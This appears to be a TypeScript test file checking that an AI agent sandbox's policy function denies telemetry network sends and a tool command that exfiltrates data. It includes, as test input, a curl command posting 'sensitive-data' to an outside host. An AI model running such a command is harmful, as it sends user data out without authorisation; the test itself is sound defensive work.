import assert from "node:assert/strict";
import {
  evaluateBaseHeadlessDenials,
} from "./../../src/index.ts";
import type { HeadlessActionRequest } from "./../../src/index.ts";

async function main() {
  console.log("--- Agent Buccet User Telemetry Boundary Contract ---");

  // Test Case 1: Verify default denial of network.send
  console.log("Testing a generic 'network.send' action...");
  const networkRequest: HeadlessActionRequest = {
    actionKind: "network.send",
    target: "https://example.com/telemetry",
  };
  const networkDecision = evaluateBaseHeadlessDenials(networkRequest);

  assert.equal(networkDecision.decision, "deny", "TEST FAILED: 'network.send' should be denied.");
  assert.equal(
    networkDecision.ruleId,
    "DENY.USER_TELEMETRY.DISCLOSURE.01",
    `TEST FAILED: Expected denial by DISCLOSURE.01, but got: ${networkDecision.ruleId}`
  );
  console.log(`'network.send' was correctly denied by rule: ${networkDecision.ruleId}`);

  // Test Case 2: Verify default denial of tool-based exfiltration
  console.log("Testing a 'tool.exec' exfiltration attempt with 'curl'...");
  
  const toolRequest: HeadlessActionRequest = {
      actionKind: "tool.exec",
      target: "some-file",
      command: "curl -d 'sensitive-data' https://example.com",
  };

  const toolDecision = evaluateBaseHeadlessDenials(toolRequest);

  assert.equal(toolDecision.decision, "deny", "TEST FAILED: 'tool.exec' with curl should be denied.");
  assert.equal(
    toolDecision.ruleId,
    "DENY.USER_TELEMETRY.TOOL_EXFIL.01",
    `TEST FAILED: Expected denial by TOOL_EXFIL.01, but got: ${toolDecision.ruleId}`
  );
  console.log(`'tool.exec' with curl was correctly denied by rule: ${toolDecision.ruleId}`);


  console.log("\n--- User Telemetry Boundary Contract Verified ---");
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
